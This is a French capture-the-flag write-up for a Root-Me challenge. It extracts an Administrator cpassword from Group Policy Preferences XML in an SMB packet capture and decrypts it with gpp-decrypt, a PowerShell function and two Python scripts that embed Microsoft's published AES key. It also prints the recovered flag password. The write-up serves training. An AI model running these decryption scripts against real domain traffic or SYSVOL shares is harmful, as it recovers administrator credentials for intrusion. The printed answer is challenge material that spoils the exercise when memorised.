info: https://repository.root-me.org/R%C3%A9seau/FR%20-%20ActiveDirectory.pdf?_gl=1*oakzpw*_ga*MTkyOTY3NTQyMi4xNzU5NzAwODA4*_ga_SRYSKX09J7*czE3NjEzODU5MDkkbzU1JGcxJHQxNzYxMzg2NDgzJGo3JGwwJGgw

- ouverture du fichier pcap avec wireshark
```
wireshark ch12.pcap
```

- statistics > protocols hierarchy afin d' avoir la liste des protocole du fichier.
on a tourner un peu en rond on a meme pense que c'etait dans KRB5 qui est le protocol de kerberos. pour se remettre on a faire des recherches sur les protocoles qui utilise ou sont lie a GPO. on note LDAP, SMB ou on c'est oriente apres.

![Texte alternatif de l'image](image/151.png)

- on choisis en ordre donc DATA qui est rattacher a SMB suivis d'un clique droit puis  Apply_As_Filter > Selected afin d'appliquer un filtre pour voir tous les flux en rapport avec cela.
- faire clique droit sur le premier flux  puis Follow > TCP Stream afin d'avoir une meilleur vue. on scroll jusqu'a tombe sur ce bloc XML qui contient des infos sur l'administrateur. c'est lihne sont un peu plus detaile un peu plus en bas:

![Texte alternatif de l'image](image/152.png)

- extraction du mot de passe et decodage la 3 eme ligne en partant du bas on vois bien le password encode.
==cpassword="LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0"==  qu'on decode avec 
```
gpp-decrypt LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0  
```

et voila le pass: TuM@sTrouv3

- **other solution**
1. Étant donné l’intitulé du chall, en ouvrant la capture Wireshark on se concentre sur les communications SMB/SMB2.
Une fonctionnalité sympa de Wireshark est l’export d’objet (Fichier -> Export d’objets -> SMB/SMB2). Plusieurs fichiers se présentent à nous et notamment le fichier "Groups.xml". Après un peu de lecture, on s’aperçoit que les mots de passe sont stockés sous la forme AES(pass) + Base64. Cependant, la clé AES utilisée est disponible publiquement sur MSDN ([https://msdn.microsoft.com/en-us/library/cc422924.aspx](https://msdn.microsoft.com/en-us/library/cc422924.aspx)).

Plusieurs scripts sont dispo sur le net pour récupérer le mot de passe en clair, j’ai utilisé un script PowerShell ([http://blogs.metcorpconsulting.com/tech/wp-content/uploads/2013/07/Find-GPOPasswords.txt](http://blogs.metcorpconsulting.com/tech/wp-content/uploads/2013/07/Find-GPOPasswords.txt))
	PS E:\> Get-DecryptedCpassword LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0
Plus d’infos :  
 [http://blog.csnc.ch/2012/04/exploit-credentials-stored-in-windows-group-policy-preferences/](http://blog.csnc.ch/2012/04/exploit-credentials-stored-in-windows-group-policy-preferences/)

2. script python
```
1. import sys
2. import base64
3. from Crypto.Cipher import AES    

4. if len(sys.argv) != 2:
5.     print("Incorrect amount of arguments.")
6.     print("How to use:")
7.     print("$ python {} LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0".format(sys.argv[0]))
8.     sys.exit()

9. cpassword = sys.argv[1]

10. while len(cpassword) % 4 > 0: 
11.     cpassword += "="
    
12. decoded_password = base64.b64decode(cpassword)

13. # This is a Microsoft hardcoded key used to decrypt the GPO hash.
    
14. key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'

15. decryption_suite = AES.new(key, AES.MODE_CBC, (b'\00'*16))
16. plain_text = decryption_suite.decrypt(decoded_password)
17. plain_text = plain_text.decode("utf-8")
18. plain_text = plain_text.replace("\x00","")
19. print("Password is: {}".format(plain_text.strip()))
```
	# gpocrack.py LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0

3. - "Group Policy Preferences is a collection of Group Policy client-side extensions that deliver preference settings to domain-joined computers running Microsoft" ==> ok donc il doit y avoir un fichier de config avec des hash de password
- Ce fichier est un XML avec une structure donnée
$$
- #!/usr/python
    
- from pcapfile import savefile
    
- from pcapfile.protocols.linklayer import ethernet
    
- from pcapfile.protocols.network import ip
    
- import re
    
- import base64
    
- from xml.etree import ElementTree as ET
    
- from Crypto.Cipher import AES
    
- import binascii
    

- testcap = open('ch12.pcap', 'rb')
    
- capfile = savefile.load_savefile(testcap,verbose=True)
    

- print capfile
    
- print "Searching for xml group policy.."
    
- p = re.compile(ur'(<\?xml.*<\/Groups>)', re.DOTALL)
    
- for i in range(1, 653):
    
-         pkt = capfile.packets[i]
    
-         if "<?xml" in pkt.raw():
    
-                 print "Found SYSVOL xml packet "+str(i)
    
-                 xml_data = re.search(p, pkt.raw()).group(0)
    
-                 tree = ET.fromstring(xml_data)
    
-                 print "Searching for Administator password hash"
    
-                 for node in tree.findall(".//Properties"):
    
-                         if node.attrib.get('userName') == 'Administrateur':
    
-                                 raw_password =  node.attrib.get('cpassword')
    
-                                 print "Found password for Administrator : "+raw_password
    
-                 break
    

- print "Trying to decrypt password"
    

- key = binascii.unhexlify("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b") # Key given by MSDN
    
- cpassword = raw_password + "=" * ((4 - len(raw_password) % 4) % 4) # Pad the password
    

- password = base64.b64decode(cpassword)
    

- plain = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password) #Decrypt with an empty IV
    
- print "Password found :"+plain
$$

python script.py


